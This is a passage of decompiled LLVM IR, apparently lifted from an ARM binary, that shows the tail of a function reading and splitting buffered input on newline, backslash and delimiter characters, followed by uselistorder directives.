  %v0_16698.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16698

dec_label_pc_16698:                               ; preds = %dec_label_pc_16644, %dec_label_pc_1668c
  %v1_166a0 = phi i32 [ %v2_16660, %dec_label_pc_16644 ], [ %v0_16698.pre, %dec_label_pc_1668c ]
  %v1_16698 = add i32 %v1_166a0, 4
  %v2_16698 = inttoptr i32 %v1_16698 to i32*
  %v3_16698 = load i32, i32* %v2_16698, align 4
  store i32 %v3_16698, i32* %r2.global-to-local, align 4
  %v4_16698 = add i32 %v1_166a0, 8
  %v5_16698 = inttoptr i32 %v4_16698 to i32*
  %v6_16698 = load i32, i32* %v5_16698, align 4
  %v2_1669c = add i32 %v6_16698, %v3_16698
  store i32 %v2_1669c, i32* %r3.global-to-local, align 4
  %v2_166a0 = add i32 %v1_166a0, 12
  %v3_166a0 = inttoptr i32 %v2_166a0 to i32*
  store i32 %v2_1669c, i32* %v3_166a0, align 4
  %v0_166a4 = load i32, i32* @fp, align 4
  store i32 %v0_166a4, i32* @r6, align 4
  br label %dec_label_pc_166a8

dec_label_pc_166a8:                               ; preds = %dec_label_pc_16734, %dec_label_pc_16720, %dec_label_pc_16698
  %v0_166b0 = phi i32 [ %v0_166a4, %dec_label_pc_16698 ], [ %v1_16720, %dec_label_pc_16720 ], [ %v0_166b0.pre.pre, %dec_label_pc_16734 ]
  %v0_166a8 = load i32, i32* @r5, align 4
  %v1_166a8 = add i32 %v0_166a8, 12
  store i32 %v1_166a8, i32* %r0.global-to-local, align 4
  %v1_166ac = inttoptr i32 %v1_166a8 to i32*
  %v2_166ac = load i32, i32* %v1_166ac, align 4
  store i32 %v2_166ac, i32* %r0.global-to-local, align 4
  %v3_166ac = add i32 %v0_166a8, 16
  %v4_166ac = inttoptr i32 %v3_166ac to i32*
  %v5_166ac = load i32, i32* %v4_166ac, align 4
  %v2_166b0 = add i32 %v2_166ac, %v0_166b0
  store i32 %v2_166b0, i32* %r0.global-to-local, align 4
  %v2_166b4 = sub i32 %v5_166ac, %v0_166b0
  %v1_166b8 = inttoptr i32 %v0_166a8 to i32*
  %v2_166b8 = load i32, i32* %v1_166b8, align 4
  store i32 %v2_166b8, i32* %r2.global-to-local, align 4
  %v3_166bc = call i32 @function_170dc(i32 %v2_166b0, i32 %v2_166b4, i32 %v2_166b8)
  store i32 %v3_166bc, i32* %r0.global-to-local, align 4
  store i32 %v3_166bc, i32* %r4.global-to-local, align 4
  %v2_166c0 = icmp eq i32 %v3_166bc, 0
  store i1 %v2_166c0, i1* %cpsr_z.global-to-local, align 1
  %v0_166c8 = load i32, i32* @r5, align 4
  %v1_166c8 = add i32 %v0_166c8, 12
  br i1 %v2_166c0, label %dec_label_pc_166c8, label %dec_label_pc_166e0

dec_label_pc_166c8:                               ; preds = %dec_label_pc_166a8
  store i32 %v1_166c8, i32* %r0.global-to-local, align 4
  %v1_166cc = inttoptr i32 %v1_166c8 to i32*
  %v2_166cc = load i32, i32* %v1_166cc, align 4
  store i32 %v2_166cc, i32* %r0.global-to-local, align 4
  %v3_166cc = add i32 %v0_166c8, 16
  %v4_166cc = inttoptr i32 %v3_166cc to i32*
  %v5_166cc = load i32, i32* %v4_166cc, align 4
  store i32 %v5_166cc, i32* @r2, align 4
  %v2_166d4 = inttoptr i32 %v2_166cc to i8*
  %v3_166d4 = call i32 @function_135d0(i8* %v2_166d4, i32 0)
  store i32 %v3_166d4, i32* %r0.global-to-local, align 4
  %v0_166d8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168f8

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166a8
  %v2_166e0 = inttoptr i32 %v1_166c8 to i32*
  %v3_166e0 = load i32, i32* %v2_166e0, align 4
  store i32 %v3_166e0, i32* @r4, align 4
  %v1_166e4 = load i32, i32* @r6, align 4
  %v2_166e4 = add i32 %v1_166e4, %v3_166e0
  store i32 %v2_166e4, i32* %r0.global-to-local, align 4
  %v1_166e8 = call i32 @function_17b90(i32 %v2_166e4)
  %v0_166f0 = load i32, i32* @r6, align 4
  %v2_166f0 = add i32 %v0_166f0, %v1_166e8
  store i32 %v2_166f0, i32* @r6, align 4
  %v0_166f4 = load i32, i32* @r4, align 4
  store i32 %v0_166f4, i32* @r0, align 4
  %v2_166f8 = call i32 @function_17ddc(i32 %v0_166f4, i32 10)
  store i32 %v2_166f8, i32* %r0.global-to-local, align 4
  %v2_166fc = icmp eq i32 %v2_166f8, 0
  store i1 %v2_166fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166fc, label %dec_label_pc_16728, label %dec_label_pc_16704

dec_label_pc_16704:                               ; preds = %dec_label_pc_166e0
  %v1_16704 = inttoptr i32 %v2_166f8 to i8*
  %v2_16704 = load i8, i8* %v1_16704, align 1
  %v3_16704 = zext i8 %v2_16704 to i32
  %v1_16708 = add nuw nsw i32 %v3_16704, 255
  %v1_1670c = urem i32 %v1_16708, 256
  store i32 %v1_1670c, i32* %r3.global-to-local, align 4
  %v7_16710 = icmp eq i32 %v1_1670c, 92
  store i1 %v7_16710, i1* %cpsr_z.global-to-local, align 1
  %v1_16714 = trunc i32 %v1_16708 to i8
  store i8 %v1_16714, i8* %v1_16704, align 1
  %v0_16718 = load i32, i32* @r6, align 4
  %v1_16718 = add i32 %v0_16718, -1
  store i32 %v1_16718, i32* @r6, align 4
  %v0_1671c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1671c, label %dec_label_pc_16720, label %dec_label_pc_167ac

dec_label_pc_16720:                               ; preds = %dec_label_pc_16704
  %v1_16720 = add i32 %v0_16718, -2
  store i32 %v1_16720, i32* @r6, align 4
  br label %dec_label_pc_166a8

dec_label_pc_16728:                               ; preds = %dec_label_pc_166e0
  %v0_16728 = load i32, i32* @r5, align 4
  %v1_16728 = add i32 %v0_16728, 20
  %v2_16728 = inttoptr i32 %v1_16728 to i32*
  %v3_16728 = load i32, i32* %v2_16728, align 4
  store i32 %v3_16728, i32* %r3.global-to-local, align 4
  %v2_1672c = icmp eq i32 %v3_16728, 0
  store i1 %v2_1672c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1672c, label %dec_label_pc_16764, label %dec_label_pc_16734

dec_label_pc_16734:                               ; preds = %dec_label_pc_16728
  %v1_16734 = add i32 %v0_16728, 16
  %v2_16734 = inttoptr i32 %v1_16734 to i32*
  %v3_16734 = load i32, i32* %v2_16734, align 4
  store i32 %v3_16734, i32* %r3.global-to-local, align 4
  %v1_16738 = add i32 %v0_16728, 8
  %v2_16738 = inttoptr i32 %v1_16738 to i32*
  %v3_16738 = load i32, i32* %v2_16738, align 4
  %v1_1673c = add i32 %v3_16734, 4096
  store i32 %v1_1673c, i32* %r3.global-to-local, align 4
  %v2_16740 = add i32 %v3_16738, %v1_1673c
  store i32 %v1_1673c, i32* %v2_16734, align 4
  %v0_16748 = load i32, i32* @r5, align 4
  %v1_16748 = add i32 %v0_16748, 4
  %v2_16748 = inttoptr i32 %v1_16748 to i32*
  %v3_16748 = load i32, i32* %v2_16748, align 4
  store i32 %v3_16748, i32* %r0.global-to-local, align 4
  %v4_1674c = inttoptr i32 %v3_16748 to i32*
  %v5_1674c = call i32 @function_145dc(i32* %v4_1674c, i32 %v2_16740, i32 %v2_166b8, i32 %v1_1673c)
  store i32 %v5_1674c, i32* %r0.global-to-local, align 4
  %v0_16750 = load i32, i32* @r5, align 4
  %v1_16750 = add i32 %v0_16750, 8
  %v2_16750 = inttoptr i32 %v1_16750 to i32*
  %v3_16750 = load i32, i32* %v2_16750, align 4
  %v2_16754 = add i32 %v3_16750, %v5_1674c
  store i32 %v2_16754, i32* %r3.global-to-local, align 4
  %v2_16758 = add i32 %v0_16750, 12
  %v3_16758 = inttoptr i32 %v2_16758 to i32*
  store i32 %v2_16754, i32* %v3_16758, align 4
  %v1_1675c = load i32, i32* @r5, align 4
  %v2_1675c = add i32 %v1_1675c, 4
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  store i32 %v5_1674c, i32* %v3_1675c, align 4
  %v0_166b0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_166a8

dec_label_pc_16764:                               ; preds = %dec_label_pc_16728, %.dec_label_pc_16764_crit_edge
  %v0_16764 = phi i32 [ %v0_16764.pre, %.dec_label_pc_16764_crit_edge ], [ %v0_16728, %dec_label_pc_16728 ]
  %v1_16764 = inttoptr i32 %v0_16764 to i32*
  %v2_16764 = load i32, i32* %v1_16764, align 4
  %v1_16768 = add i32 %v2_16764, 52
  %v2_16768 = inttoptr i32 %v1_16768 to i32*
  %v3_16768 = load i32, i32* %v2_16768, align 4
  store i32 %v3_16768, i32* %r3.global-to-local, align 4
  %v2_1676c = icmp eq i32 %v3_16768, 0
  store i1 %v2_1676c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1676c, label %dec_label_pc_16798, label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_16764
  %v1_16774 = add i32 %v2_16764, 16
  %v2_16774 = inttoptr i32 %v1_16774 to i32*
  %v3_16774 = load i32, i32* %v2_16774, align 4
  store i32 %v3_16774, i32* %r2.global-to-local, align 4
  %v1_16778 = add i32 %v2_16764, 24
  %v2_16778 = inttoptr i32 %v1_16778 to i32*
  %v3_16778 = load i32, i32* %v2_16778, align 4
  store i32 %v3_16778, i32* %r3.global-to-local, align 4
  %v3_1677c = icmp ult i32 %v3_16774, %v3_16778
  %v9_1677c = icmp eq i32 %v3_16774, %v3_16778
  store i1 %v9_1677c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1677c, label %dec_label_pc_167a0thread-pre-split, label %dec_label_pc_1678c

dec_label_pc_1678c:                               ; preds = %dec_label_pc_16774
  store i32 %v2_16764, i32* %r0.global-to-local, align 4
  %v1_16790 = inttoptr i32 %v2_16764 to i16*
  %v2_16790 = call i32 @function_1752c(i16* %v1_16790)
  store i32 %v2_16790, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_16798:                               ; preds = %dec_label_pc_16764
  store i32 %v2_16764, i32* %r0.global-to-local, align 4
  %v1_1679c = call i32 @function_17000(i32 %v2_16764)
  store i32 %v1_1679c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0thread-pre-split:               ; preds = %dec_label_pc_16774
  %v2_16780 = inttoptr i32 %v3_16774 to i8*
  %v3_16780 = load i8, i8* %v2_16780, align 1
  %v4_16780 = zext i8 %v3_16780 to i32
  store i32 %v4_16780, i32* %r0.global-to-local, align 4
  %v6_16780 = add i32 %v3_16774, 1
  store i32 %v6_16780, i32* %r2.global-to-local, align 4
  store i32 %v6_16780, i32* %v2_16774, align 4
  %v0_167a0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %dec_label_pc_167a0thread-pre-split, %dec_label_pc_1678c, %dec_label_pc_16798
  %v1_167a4 = phi i32 [ %v0_167a0.pr, %dec_label_pc_167a0thread-pre-split ], [ %v2_16790, %dec_label_pc_1678c ], [ %v1_1679c, %dec_label_pc_16798 ]
  %v7_167a0 = icmp eq i32 %v1_167a4, 10
  store i1 %v7_167a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167a0, label %dec_label_pc_167ac.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_167a0
  %v8_167a4 = icmp eq i32 %v1_167a4, -1
  store i1 %v8_167a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_167a4, label %dec_label_pc_167ac.loopexit, label %.dec_label_pc_16764_crit_edge

.dec_label_pc_16764_crit_edge:                    ; preds = %bb68
  %v0_16764.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16764

dec_label_pc_167ac.loopexit:                      ; preds = %bb68, %dec_label_pc_167a0
  %v0_167ac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_16704, %dec_label_pc_167ac.loopexit
  %v0_167ac = phi i32 [ %v0_167ac.pre, %dec_label_pc_167ac.loopexit ], [ %v1_16718, %dec_label_pc_16704 ]
  %v7_167ac = icmp eq i32 %v0_167ac, -1
  store i1 %v7_167ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167ac, label %dec_label_pc_168f4, label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %dec_label_pc_167ac
  %v0_167b4 = load i32, i32* @r5, align 4
  %v1_167b4 = add i32 %v0_167b4, 4
  %v2_167b4 = inttoptr i32 %v1_167b4 to i32*
  %v3_167b4 = load i32, i32* %v2_167b4, align 4
  store i32 %v3_167b4, i32* %r0.global-to-local, align 4
  store i32 %v3_16608, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_167b4, i32* %v2_167c0, align 4
  %v0_167c4 = load i32, i32* @fp, align 4
  %v2_167c8 = inttoptr i32 %v3_167b4 to i8*
  %v3_167c8 = call i32 @function_135d0(i8* %v2_167c8, i32 %v0_167c4)
  store i32 %v3_167c8, i32* %r0.global-to-local, align 4
  store i32 %v1_1661c, i32* %r2.global-to-local, align 4
  store i1 %v2_167d0, i1* %cpsr_z.global-to-local, align 1
  %v0_167d4 = load i32, i32* @r5, align 4
  %v1_167d4 = add i32 %v0_167d4, 12
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  store i32 %v3_167d4, i32* @r4, align 4
  br i1 %v2_167d0, label %dec_label_pc_167ec, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167b4
  store i32 %v3_167d4, i32* @r0, align 4
  %v0_167e0 = load i32, i32* @sl, align 4
  %v2_167e4 = inttoptr i32 %v3_167d4 to i8*
  %v3_167e4 = call i32 @function_17c54(i8* %v2_167e4, i32 %v0_167e0)
  store i32 %v3_167e4, i32* %r0.global-to-local, align 4
  %v0_167e8 = load i32, i32* @r4, align 4
  %v2_167e8 = add i32 %v0_167e8, %v3_167e4
  store i32 %v2_167e8, i32* @r4, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167b4, %dec_label_pc_167dc
  %v0_168c413 = phi i32 [ %v3_167d4, %dec_label_pc_167b4 ], [ %v2_167e8, %dec_label_pc_167dc ]
  %v1_167ec = inttoptr i32 %v0_168c413 to i8*
  %v2_167ec = load i8, i8* %v1_167ec, align 1
  %v3_167ec = zext i8 %v2_167ec to i32
  store i32 %v3_167ec, i32* %r2.global-to-local, align 4
  %v2_167f0 = icmp eq i8 %v2_167ec, 0
  store i1 %v2_167f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167f0, label %dec_label_pc_16644.backedge, label %dec_label_pc_167f8

dec_label_pc_16644.backedge:                      ; preds = %dec_label_pc_167ec, %dec_label_pc_168ec, %dec_label_pc_167f8
  %v0_16644.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16644

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167ec
  %v0_167f8 = load i32, i32* @r7, align 4
  %v1_167f8 = inttoptr i32 %v0_167f8 to i8*
  %v2_167f8 = load i8, i8* %v1_167f8, align 1
  %v3_167f8 = zext i8 %v2_167f8 to i32
  store i32 %v3_167f8, i32* %r3.global-to-local, align 4
  %v9_167fc = icmp eq i8 %v2_167f8, %v2_167ec
  store i1 %v9_167fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_167fc, label %dec_label_pc_16644.backedge, label %dec_label_pc_168c4.preheader

dec_label_pc_168c4.preheader:                     ; preds = %dec_label_pc_167f8
  %v1_16800 = load i32, i32* @fp, align 4
  store i32 %v1_16800, i32* @r6, align 4
  %v2_168c415 = load i8, i8* %v1_167ec, align 1
  %v3_168c416 = zext i8 %v2_168c415 to i32
  store i32 %v3_168c416, i32* %r2.global-to-local, align 4
  %v2_168c817 = icmp eq i8 %v2_168c415, 0
  store i1 %v2_168c817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c817, label %dec_label_pc_168e0, label %dec_label_pc_168d0.preheader

dec_label_pc_168d0.preheader:                     ; preds = %dec_label_pc_168c4.preheader
  %v2_168d082 = load i8, i8* %v1_167f8, align 1
  %v3_168d083 = zext i8 %v2_168d082 to i32
  store i32 %v3_168d083, i32* %r3.global-to-local, align 4
  %v9_168d486 = icmp eq i8 %v2_168d082, %v2_168c415
  store i1 %v9_168d486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_168d486, label %dec_label_pc_168e0, label %bb74

dec_label_pc_1680c:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_16810 = load i32, i32* %v2_167c0, align 4
  store i32 %v2_16810, i32* %r3.global-to-local, align 4
  store i32 %v1_16620, i32* %r2.global-to-local, align 4
  %v9_16818 = icmp eq i32 %v2_1681c88, %v1_16620
  store i1 %v9_16818, i1* %cpsr_z.global-to-local, align 1
  %v5_1681c = mul i32 %v2_1681c88, 4
  %v6_1681c = add i32 %v2_16810, %v5_1681c
  %v7_1681c = inttoptr i32 %v6_1681c to i32*
  store i32 %v0_1681c87, i32* %v7_1681c, align 4
  br i1 %v9_16818, label %dec_label_pc_16824, label %dec_label_pc_16830

dec_label_pc_16824:                               ; preds = %dec_label_pc_1680c
  store i32 %v1_1662c, i32* %r3.global-to-local, align 4
  store i1 %v2_16828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16828, label %dec_label_pc_16830, label %dec_label_pc_16850

dec_label_pc_16830:                               ; preds = %dec_label_pc_16824, %dec_label_pc_1680c
  %v0_16830 = load i32, i32* @r7, align 4
  %v1_16830 = inttoptr i32 %v0_16830 to i8*
  %v2_16830 = load i8, i8* %v1_16830, align 1
  %v3_16830 = zext i8 %v2_16830 to i32
  store i32 %v3_16830, i32* %r3.global-to-local, align 4
  %v2_16834 = icmp eq i8 %v2_16830, 0
  store i1 %v2_16834, i1* %cpsr_z.global-to-local, align 1
  %v0_16838 = load i32, i32* @r4, align 4
  store i32 %v0_16838, i32* @r0, align 4
  %v1_1683c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_16834, i32 %v1_1683c, i32 %v0_16830
  store i32 %storemerge, i32* @r1, align 4
  %v0_16844 = call i32 @function_17c10()
  store i32 %v0_16844, i32* %r0.global-to-local, align 4
  %v0_16848 = load i32, i32* @r4, align 4
  %v2_16848 = add i32 %v0_16848, %v0_16844
  store i32 %v2_16848, i32* @r4, align 4
  br label %dec_label_pc_16888

dec_label_pc_16850:                               ; preds = %dec_label_pc_16824
  %v0_16850 = load i32, i32* @r4, align 4
  store i32 %v0_16850, i32* @r0, align 4
  %v0_16854 = load i32, i32* @r7, align 4
  %v1_16854 = inttoptr i32 %v0_16854 to i8*
  %v2_16854 = load i8, i8* %v1_16854, align 1
  %v3_16854 = zext i8 %v2_16854 to i32
  %v5_16858 = call i32 @function_17cf0(i32 %v0_16850, i32 %v3_16854, i32 %v1_16620, i32 %v1_1662c)
  store i32 %v5_16858, i32* %r0.global-to-local, align 4
  store i32 %v1_1661c, i32* %r2.global-to-local, align 4
  store i1 %v2_167d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16858, i32* @r4, align 4
  br i1 %v2_167d0, label %dec_label_pc_16888, label %dec_label_pc_16874

dec_label_pc_16870:                               ; preds = %dec_label_pc_16874
  %v1_16870 = add i32 %v0_16888.pre, -1
  store i32 %v1_16870, i32* @r4, align 4
  br label %dec_label_pc_16874

dec_label_pc_16874:                               ; preds = %dec_label_pc_16850, %dec_label_pc_16870
  %v0_16874 = phi i32 [ %v1_16870, %dec_label_pc_16870 ], [ %v5_16858, %dec_label_pc_16850 ]
  %v1_16874 = add i32 %v0_16874, -1
  %v2_16874 = inttoptr i32 %v1_16874 to i8*
  %v3_16874 = load i8, i8* %v2_16874, align 1
  %v4_16874 = zext i8 %v3_16874 to i32
  %v0_16878 = load i32, i32* @sl, align 4
  store i32 %v0_16878, i32* @r0, align 4
  %v2_1687c = call i32 @function_17ddc(i32 %v0_16878, i32 %v4_16874)
  store i32 %v2_1687c, i32* %r0.global-to-local, align 4
  %v2_16880 = icmp eq i32 %v2_1687c, 0
  store i1 %v2_16880, i1* %cpsr_z.global-to-local, align 1
  %v0_16888.pre = load i32, i32* @r4, align 4
  br i1 %v2_16880, label %dec_label_pc_16888, label %dec_label_pc_16870

dec_label_pc_16888:                               ; preds = %dec_label_pc_16874, %dec_label_pc_16850, %dec_label_pc_16830
  %v3_16894 = phi i32 [ %v5_16858, %dec_label_pc_16850 ], [ %v2_16848, %dec_label_pc_16830 ], [ %v0_16888.pre, %dec_label_pc_16874 ]
  %v1_16888 = inttoptr i32 %v3_16894 to i8*
  %v2_16888 = load i8, i8* %v1_16888, align 1
  %v3_16888 = zext i8 %v2_16888 to i32
  store i32 %v3_16888, i32* %r2.global-to-local, align 4
  %v0_1688c = load i32, i32* @r7, align 4
  %v1_1688c = inttoptr i32 %v0_1688c to i8*
  %v2_1688c = load i8, i8* %v1_1688c, align 1
  %v3_1688c = zext i8 %v2_1688c to i32
  store i32 %v3_1688c, i32* %r3.global-to-local, align 4
  %v9_16890 = icmp eq i8 %v2_1688c, %v2_16888
  store i1 %v9_16890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16890, label %bb71, label %dec_label_pc_1689c

bb71:                                             ; preds = %dec_label_pc_16888
  %v1_16894 = load i32, i32* @fp, align 4
  %v2_16894 = trunc i32 %v1_16894 to i8
  store i8 %v2_16894, i8* %v1_16888, align 1
  %v0_16898.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16898.pr, label %bb73, label %.dec_label_pc_1689c_crit_edge

.dec_label_pc_1689c_crit_edge:                    ; preds = %bb71
  %v0_1689c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1689c

dec_label_pc_1689c:                               ; preds = %.dec_label_pc_1689c_crit_edge, %dec_label_pc_16888
  %v0_1689c = phi i32 [ %v0_1689c.pre, %.dec_label_pc_1689c_crit_edge ], [ %v3_16888, %dec_label_pc_16888 ]
  %v2_1689c = icmp eq i32 %v0_1689c, 0
  store i1 %v2_1689c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1689c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_1689c
  %v1_168a0 = load i32, i32* @fp, align 4
  %v2_168a0 = trunc i32 %v1_168a0 to i8
  %v3_168a0 = load i32, i32* @r4, align 4
  %v4_168a0 = inttoptr i32 %v3_168a0 to i8*
  store i8 %v2_168a0, i8* %v4_168a0, align 1
  %v5_168a0 = load i32, i32* @r4, align 4
  %v6_168a0 = add i32 %v5_168a0, 1
  store i32 %v6_168a0, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_1689c, %bb72
  %v2_168a4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_168a4, i32* %r3.global-to-local, align 4
  %v2_168a8 = icmp eq i32 %v2_168a4, 0
  store i1 %v2_168a8, i1* %cpsr_z.global-to-local, align 1
  %v0_168c4.pre = load i32, i32* @r4, align 4
  br i1 %v2_168a8, label %dec_label_pc_168c0, label %dec_label_pc_168b0

dec_label_pc_168b0:                               ; preds = %bb73
  store i32 %v0_168c4.pre, i32* @r0, align 4
  %v0_168b4 = load i32, i32* @sl, align 4
  %v2_168b8 = inttoptr i32 %v0_168c4.pre to i8*
  %v3_168b8 = call i32 @function_17c54(i8* %v2_168b8, i32 %v0_168b4)
  store i32 %v3_168b8, i32* %r0.global-to-local, align 4
  %v0_168bc = load i32, i32* @r4, align 4
  %v2_168bc = add i32 %v0_168bc, %v3_168b8
  store i32 %v2_168bc, i32* @r4, align 4
  br label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %bb73, %dec_label_pc_168b0
  %v0_168c4 = phi i32 [ %v2_168bc, %dec_label_pc_168b0 ], [ %v0_168c4.pre, %bb73 ]
  %v0_168c0 = load i32, i32* @r6, align 4
  %v1_168c0 = add i32 %v0_168c0, 1
  store i32 %v1_168c0, i32* @r6, align 4
  %v1_168c4 = inttoptr i32 %v0_168c4 to i8*
  %v2_168c4 = load i8, i8* %v1_168c4, align 1
  %v3_168c4 = zext i8 %v2_168c4 to i32
  store i32 %v3_168c4, i32* %r2.global-to-local, align 4
  %v2_168c8 = icmp eq i8 %v2_168c4, 0
  store i1 %v2_168c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c8, label %dec_label_pc_168e0, label %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge

dec_label_pc_168c0.dec_label_pc_168d0_crit_edge:  ; preds = %dec_label_pc_168c0
  %v0_168d0.pre = load i32, i32* @r7, align 4
  %v1_168d0 = inttoptr i32 %v0_168d0.pre to i8*
  %v2_168d0 = load i8, i8* %v1_168d0, align 1
  %v3_168d0 = zext i8 %v2_168d0 to i32
  store i32 %v3_168d0, i32* %r3.global-to-local, align 4
  %v9_168d4 = icmp eq i8 %v2_168d0, %v2_168c4
  store i1 %v9_168d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_168d4, label %dec_label_pc_168e0, label %bb74

bb74:                                             ; preds = %dec_label_pc_168d0.preheader, %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge
  %v2_1681c88 = phi i32 [ %v1_168c0, %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge ], [ %v1_16800, %dec_label_pc_168d0.preheader ]
  %v0_1681c87 = phi i32 [ %v0_168c4, %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge ], [ %v0_168c413, %dec_label_pc_168d0.preheader ]
  %v2_168d8 = load i32, i32* @sb, align 4
  %v3_168d8 = sub i32 %v2_1681c88, %v2_168d8
  %v5_168d8 = xor i32 %v2_168d8, %v2_1681c88
  %v6_168d8 = xor i32 %v3_168d8, %v2_1681c88
  %v7_168d8 = and i32 %v6_168d8, %v5_168d8
  %v8_168d8 = icmp slt i32 %v7_168d8, 0
  %v9_168d8 = icmp slt i32 %v3_168d8, 0
  %v10_168d8 = icmp eq i32 %v2_1681c88, %v2_168d8
  store i1 %v10_168d8, i1* %cpsr_z.global-to-local, align 1
  %v2_168dc = xor i1 %v9_168d8, %v8_168d8
  br i1 %v2_168dc, label %dec_label_pc_1680c, label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168d0.preheader, %bb74, %dec_label_pc_168c0, %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge, %dec_label_pc_168c4.preheader
  %v0_168e4 = phi i32 [ %v1_16800, %dec_label_pc_168c4.preheader ], [ %v1_16800, %dec_label_pc_168d0.preheader ], [ %v2_1681c88, %bb74 ], [ %v1_168c0, %dec_label_pc_168c0 ], [ %v1_168c0, %dec_label_pc_168c0.dec_label_pc_168d0_crit_edge ]
  store i32 %v3_16604, i32* %r2.global-to-local, align 4
  %v9_168e4 = icmp eq i32 %v0_168e4, %v3_16604
  store i1 %v9_168e4, i1* %cpsr_z.global-to-local, align 1
  %v6_168e8 = icmp slt i32 %v0_168e4, %v3_16604
  br i1 %v6_168e8, label %dec_label_pc_168ec, label %dec_label_pc_168f8

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168e0
  %v0_168ec = load i32, i32* @r8, align 4
  %v1_168ec = and i32 %v0_168ec, 1048576
  %v2_168ec = icmp eq i32 %v1_168ec, 0
  store i1 %v2_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168ec, label %dec_label_pc_16644.backedge, label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168ec, %dec_label_pc_167ac, %.thread, %dec_label_pc_165e0
  br label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168e0, %dec_label_pc_166c8, %dec_label_pc_168f4
  %v0_168f8 = phi i32 [ %v0_166d8, %dec_label_pc_166c8 ], [ 0, %dec_label_pc_168f4 ], [ %v0_168e4, %dec_label_pc_168e0 ]
  store i32 %v0_168f8, i32* %r0.global-to-local, align 4
  store i32 %v3_165e0, i32* @r4, align 4
  store i32 %v6_165e0, i32* @r5, align 4
  store i32 %v9_165e0, i32* @r6, align 4
  store i32 %v12_165e0, i32* @r7, align 4
  store i32 %v15_165e0, i32* @r8, align 4
  store i32 %v18_165e0, i32* @sb, align 4
  store i32 %v21_165e0, i32* @sl, align 4
  store i32 %v24_165e0, i32* @fp, align 4
  ret i32 %v0_168f8

; uselistorder directives
  uselistorder i32 %v0_168f8, { 1, 0 }
  uselistorder i32 %v0_168e4, { 0, 2, 1 }
  uselistorder i32 %v3_168d8, { 1, 0 }
  uselistorder i32 %v2_168d8, { 1, 0, 2 }
  uselistorder i32 %v2_1681c88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_168d4, { 1, 0 }
  uselistorder i32 %v0_168c4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_16858, { 1, 0, 2, 3 }
  uselistorder i1 %v9_168d486, { 1, 0 }
  uselistorder i1 %v9_167fc, { 1, 0 }
  uselistorder i32 %v3_167d4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_167ac, { 1, 0 }
  uselistorder i1 %v8_167a4, { 1, 0 }
  uselistorder i32 %v3_16774, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_16764, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_1674c, { 1, 0, 2 }
  uselistorder i32 %v1_1673c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16728, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16720, { 1, 0 }
  uselistorder i32 %v1_1670c, { 1, 0 }
  uselistorder i32 %v1_16708, { 1, 0 }
